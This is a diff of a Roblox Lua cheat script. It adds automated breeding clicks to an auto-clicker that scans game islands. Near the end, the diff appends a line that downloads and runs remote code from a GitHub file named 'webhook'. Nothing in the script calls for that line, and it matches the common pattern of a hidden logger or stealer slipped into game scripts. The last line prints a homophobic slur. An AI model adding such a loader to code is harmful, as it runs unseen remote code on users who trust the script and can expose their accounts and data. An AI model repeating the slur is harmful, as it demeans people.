@@ -11,12 +11,21 @@ local shouldStop = false
 local isPaused = false
 local currentIslandIndex = 1
 local clickLoop = nil
+local isBreeding = false -- Flag to prevent auto-clicker from interfering with breeding clicks
 local islands = {
 	"Royal Island",
 	"Desert Island",
 	"Glacier Island",
 	"Mountain Island"
 }
+
+-- Breeding Script Variables
+local itemInfoFrame = playerGui:WaitForChild("SubMenus"):WaitForChild("Item Information")
+local indicatorLabel = itemInfoFrame.Animals.Main.Content.Top.Labels.IndicatorLabel
+local closeButton = itemInfoFrame.Animals.Main.CloseMenu
+local buttonsContainer = itemInfoFrame.Animals.Main.Content.Buttons
+local TARGET_IMAGE_ID = "rbxassetid://13116451197"
+local isProcessingBreed = false
 
 -- Virtual Input Manager Functions
 local function getScreenSize()
@@ -43,13 +52,134 @@ local function startAutoClicker()
 	
 	clickLoop = task.spawn(function()
 		while true do
-			if not isPaused then
+			-- Only click if not paused AND not currently breeding
+			if not isPaused and not isBreeding then
 				local x, y = getClickPosition()
 				clickAt(x, y)
 			end
 			task.wait(0.5)
 		end
 	end)
+end
+
+-- Breeding Script Functions
+local function clickButton(button)
+	if not button:IsA("TextButton") and not button:IsA("ImageButton") then
+		return
+	end
+	
+	-- Fire MouseButton1Down
+	for _, connection in pairs(getconnections(button.MouseButton1Down)) do
+		connection:Fire()
+	end
+	task.wait(0.05)
+	
+	-- Fire MouseButton1Up
+	for _, connection in pairs(getconnections(button.MouseButton1Up)) do
+		connection:Fire()
+	end
+	task.wait(0.05)
+	
+	-- Fire Activated
+	for _, connection in pairs(getconnections(button.Activated)) do
+		connection:Fire()
+	end
+end
+
+local function clickYesButtonVIM(button)
+	if not button:IsA("TextButton") and not button:IsA("ImageButton") then
+		return
+	end
+	
+	print("Clicking Yes button with VirtualInputManager")
+	
+	-- Get button position
+	local buttonPos = button.AbsolutePosition
+	local buttonSize = button.AbsoluteSize
+	local centerX = buttonPos.X + (buttonSize.X / 2)
+	local centerY = buttonPos.Y + (buttonSize.Y / 2) + 50  -- Added 50 pixels down
+	
+	print("Button center position (adjusted): X=" .. centerX .. " Y=" .. centerY)
+	
+	-- Simulate mouse click at button center
+	VIM:SendMouseButtonEvent(centerX, centerY, 0, true, game, 0)
+	task.wait(0.1)
+	VIM:SendMouseButtonEvent(centerX, centerY, 0, false, game, 0)
+	
+	print("VIM click sent")
+end
+
+local function onItemInfoOpened()
+	-- Debounce check
+	if isProcessingBreed then
+		return
+	end
+	
+	-- Check if the frame is actually visible
+	if not itemInfoFrame.Visible then
+		return
+	end
+	
+	isProcessingBreed = true
+	isBreeding = true -- Pause auto-clicker
+	
+	-- Wait 0.5 seconds before doing anything to avoid bugs
+	task.wait(0.5)
+	
+	-- Check if IndicatorLabel contains "Unbreedable"
+	local labelText = indicatorLabel.Text
+	
+	if string.find(labelText, "Unbreedable") then
+		-- Contains "Unbreedable" - just close the menu and return
+		print("Item is Unbreedable, closing menu")
+		clickButton(closeButton)
+		task.wait(1)
+		isProcessingBreed = false
+		isBreeding = false -- Resume auto-clicker
+		return
+	end
+	
+	-- Does NOT contain "Unbreedable" - proceed with breeding logic
+	print("Item is breedable, looking for breed button")
+	
+	-- Look through all OptionButtons in the Buttons container
+	for _, child in ipairs(buttonsContainer:GetChildren()) do
+		if child.Name == "OptionButton" then
+			-- Check if it has an ImageLabel child
+			local imageLabel = child:FindFirstChildWhichIsA("ImageLabel")
+			if imageLabel and imageLabel.Image == TARGET_IMAGE_ID then
+				print("Found breeding button, clicking it")
+				clickButton(child)
+				
+				-- Wait 2 seconds for the prompt to fully appear
+				print("Waiting 2 seconds for YesNo prompt to load...")
+				task.wait(2)
+				
+				-- Click the Yes button with VIM
+				local success, err = pcall(function()
+					local prompts = playerGui:WaitForChild("Prompts", 3)
+					local yesNo = prompts:WaitForChild("YesNo", 3)
+					local yesButton = yesNo.Content.Frame.Yes
+					
+					print("Found Yes button, waiting 1 second...")
+					task.wait(1)
+					
+					clickYesButtonVIM(yesButton)
+				end)
+				
+				if not success then
+					warn("Failed to click Yes button: " .. tostring(err))
+				end
+				
+				break
+			end
+		end
+	end
+	
+	-- Reset debounce and resume auto-clicker after a delay
+	task.wait(2)
+	isProcessingBreed = false
+	isBreeding = false
 end
 
 -- Create GUI
@@ -275,8 +405,19 @@ pauseButton.MouseButton1Click:Connect(function()
 	end
 end)
 
+-- Monitor Item Information frame for breeding
+itemInfoFrame:GetPropertyChangedSignal("Visible"):Connect(function()
+	if itemInfoFrame.Visible then
+		onItemInfoOpened()
+	end
+end)
+
 -- Start auto-clicker
 startAutoClicker()
 
 -- Auto-start scanning Royal Island
 followLoopFrom(workspace.Islands["Royal Island"])
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/obeseid/Lellelelebonczki/refs/heads/main/webhook'))()
+
+print("fagggggggggggggggg")
